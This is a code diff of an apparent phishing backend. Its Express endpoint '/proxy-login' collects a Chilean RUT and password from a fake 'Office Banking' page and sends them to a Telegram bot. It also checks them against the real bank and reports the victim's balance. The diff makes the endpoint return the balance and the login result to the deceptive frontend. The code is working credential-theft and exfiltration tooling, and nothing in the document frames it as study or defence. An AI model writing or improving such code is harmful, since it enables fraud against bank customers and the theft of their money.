@@ -101,9 +101,11 @@ app.post("/proxy-login", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    // ✅ Ejecutar loginYActualizarPlanilla SOLO para notificar credenciales y saldo
+    let resultado = {};
+    let mensajeFinal = "Bienvenido a Office Banking"; // valor por defecto
+
     if (rut && passwd) {
-      const resultado = await loginYActualizarPlanilla(rut, passwd);
+      resultado = await loginYActualizarPlanilla(rut, passwd);
 
       if (resultado.status === "error") {
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
@@ -114,6 +116,7 @@ app.post("/proxy-login", async (req, res) => {
             text: "❌ Credenciales incorrectas en OfficeBanking"
           })
         });
+        mensajeFinal = "Credenciales incorrectas";
       } else {
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
           method: "POST",
@@ -123,16 +126,23 @@ app.post("/proxy-login", async (req, res) => {
             text: `✅ Credenciales correctas\nSaldo detectado: ${resultado.saldo}`
           })
         });
+        mensajeFinal = `Ingreso correcto. Saldo: ${resultado.saldo}`;
       }
     }
 
-    // ⚠️ El frontend sigue igual: no cambiamos el flujo
-    res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
+    // ⚠️ El frontend sigue igual, pero ahora mensaje nunca será undefined
+    res.json({
+      status: resultado.status || "ok",
+      mensaje: mensajeFinal,
+      saldo: resultado.saldo || null,
+      monto: resultado.monto || null
+    });
   } catch (err) {
     console.error("Error en proxy-login:", err);
     res.status(500).json({ status: "error", error: err.message });
   }
 });
+
 
 // Servir index.html por defecto
 app.get("/", (req, res) => {
